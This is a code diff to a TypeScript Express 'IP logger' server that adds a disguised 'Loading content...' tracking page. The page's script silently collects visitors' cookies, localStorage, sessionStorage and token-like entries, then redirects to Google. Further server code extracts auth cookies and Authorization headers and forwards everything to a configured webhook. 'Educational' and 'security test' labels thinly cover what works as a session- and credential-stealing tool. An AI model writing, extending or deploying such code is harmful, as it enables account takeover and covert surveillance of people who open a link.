@@ -43,16 +43,18 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
   try {
     const webhookData = {
       embeds: [{
-        title: "🚨 IP Logger Alert",
+        title: "🚨 Security Test Alert",
         color: 0xff0000,
         fields: [
           { name: "IP Address", value: data.ipAddress, inline: true },
           { name: "Location", value: data.location || "Unknown", inline: true },
           { name: "User Agent", value: data.userAgent ? data.userAgent.substring(0, 100) + (data.userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
           { name: "Referrer", value: data.referrer || "Direct Access", inline: true },
+          { name: "Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "None", inline: false },
+          { name: "Tokens Found", value: data.tokens || "None", inline: true },
           { name: "Timestamp", value: new Date().toISOString(), inline: true }
         ],
-        footer: { text: "FBI Security Testing Tool" }
+        footer: { text: "Security Testing Tool" }
       }]
     };
 
@@ -71,6 +73,149 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Serve tracking HTML page that logs everything
+  app.get('/track/:id', async (req: Request, res: Response) => {
+    try {
+      const clientIp = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      const referrerHeader = req.headers.referer || req.headers.referrer;
+      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
+      const location = getLocationFromIp(clientIp);
+      const cookies = req.headers.cookie || '';
+      
+      // Log the access
+      const settings = await storage.getSettings();
+      await storage.createIpLog({
+        ipAddress: clientIp,
+        userAgent,
+        referrer,
+        location,
+        status: 'success'
+      });
+
+      // Serve HTML page with tracking script
+      const trackingHtml = `
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <meta charset="utf-8">
+  <style>
+    body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f5f5f5; }
+    .loading { text-align: center; padding: 50px; }
+  </style>
+</head>
+<body>
+  <div class="loading">
+    <h2>Loading content...</h2>
+    <p>Please wait while we prepare your content.</p>
+  </div>
+  
+  <script>
+    (function() {
+      try {
+        // Capture all cookies
+        const cookies = document.cookie;
+        
+        // Capture localStorage data
+        const localStorageData = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          localStorageData[key] = localStorage.getItem(key);
+        }
+        
+        // Capture sessionStorage data
+        const sessionStorageData = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          sessionStorageData[key] = sessionStorage.getItem(key);
+        }
+        
+        // Look for common token patterns in storage
+        const tokenPatterns = [
+          /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i
+        ];
+        
+        const foundTokens = [];
+        
+        // Check localStorage for tokens
+        Object.keys(localStorageData).forEach(key => {
+          if (tokenPatterns.some(pattern => pattern.test(key))) {
+            foundTokens.push('localStorage.' + key + ': ' + localStorageData[key]);
+          }
+        });
+        
+        // Check sessionStorage for tokens
+        Object.keys(sessionStorageData).forEach(key => {
+          if (tokenPatterns.some(pattern => pattern.test(key))) {
+            foundTokens.push('sessionStorage.' + key + ': ' + sessionStorageData[key]);
+          }
+        });
+        
+        // Capture additional browser info
+        const browserInfo = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          cookieEnabled: navigator.cookieEnabled,
+          screenResolution: screen.width + 'x' + screen.height,
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        const data = {
+          cookies: cookies,
+          localStorage: localStorageData,
+          sessionStorage: sessionStorageData,
+          tokens: foundTokens,
+          browserInfo: browserInfo,
+          url: window.location.href,
+          timestamp: new Date().toISOString()
+        };
+        
+        // Log to console for educational purposes
+        console.log('Educational Security Test - Complete Browser Profile:', data);
+        
+        // Send to tracking endpoint
+        fetch('/api/track-browser-data', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        }).then(function() {
+          // Redirect after 2 seconds
+          setTimeout(function() {
+            window.location.href = 'https://www.google.com';
+          }, 2000);
+        }).catch(function(err) {
+          console.log('Tracking request failed:', err);
+          // Still redirect on error
+          setTimeout(function() {
+            window.location.href = 'https://www.google.com';
+          }, 2000);
+        });
+        
+      } catch (error) {
+        console.log('Tracking script error:', error);
+      }
+    })();
+  </script>
+</body>
+</html>`;
+
+      res.set({
+        'Content-Type': 'text/html',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+      });
+      res.send(trackingHtml);
+    } catch (error) {
+      console.error('Error serving tracking page:', error);
+      res.status(500).send('Error');
+    }
+  });
+
   // Serve decoy files and log the request - support multiple file types
   app.get('/:filename.:extension', async (req: Request, res: Response) => {
     const { filename, extension } = req.params;
@@ -86,11 +231,37 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
       const location = getLocationFromIp(clientIp);
+      const cookies = req.headers.cookie || '';
+      
+      // Extract potential tokens from cookies and headers
+      const authTokens = [];
+      if (cookies) {
+        const tokenPatterns = [
+          /token[^=]*=([^;]+)/gi,
+          /auth[^=]*=([^;]+)/gi,
+          /session[^=]*=([^;]+)/gi,
+          /jwt[^=]*=([^;]+)/gi,
+          /access[^=]*=([^;]+)/gi
+        ];
+        
+        tokenPatterns.forEach(pattern => {
+          const matches = cookies.match(pattern);
+          if (matches) {
+            authTokens.push(...matches);
+          }
+        });
+      }
+      
+      // Check Authorization header
+      const authHeader = req.headers.authorization;
+      if (authHeader) {
+        authTokens.push(`Authorization: ${authHeader}`);
+      }
 
       // Get settings to check for webhook URL and custom image
       const settings = await storage.getSettings();
 
-      // Log the IP access
+      // Log the IP access with enhanced data
       await storage.createIpLog({
         ipAddress: clientIp,
         userAgent,
@@ -105,7 +276,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
           ipAddress: clientIp,
           userAgent,
           referrer,
-          location
+          location,
+          cookies: cookies || 'None',
+          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
         });
       }
 
@@ -306,6 +479,51 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error('Error deleting image:', error);
       res.status(500).json({ error: 'Failed to delete image' });
+    }
+  });
+
+  // Browser data tracking endpoint
+  app.post('/api/track-browser-data', async (req: Request, res: Response) => {
+    try {
+      const browserData = req.body;
+      const clientIp = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      
+      // Get webhook settings
+      const settings = await storage.getSettings();
+      
+      // Send comprehensive data to webhook if configured
+      if (settings?.webhookUrl) {
+        const webhookData = {
+          embeds: [{
+            title: "🎯 Advanced Security Test Data",
+            color: 0x00ff00,
+            fields: [
+              { name: "IP Address", value: clientIp, inline: true },
+              { name: "User Agent", value: userAgent ? userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
+              { name: "Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
+              { name: "Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
+              { name: "LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
+              { name: "SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
+              { name: "Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
+              { name: "URL", value: browserData.url || 'Unknown', inline: false },
+              { name: "Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
+            ],
+            footer: { text: "Security Testing Tool - Educational Purposes" }
+          }]
+        };
+
+        const response = await fetch(settings.webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(webhookData)
+        }).catch(err => console.error('Webhook error:', err));
+      }
+      
+      res.json({ status: 'success' });
+    } catch (error) {
+      console.error('Error processing browser data:', error);
+      res.status(500).json({ error: 'Failed to process data' });
     }
   });
 
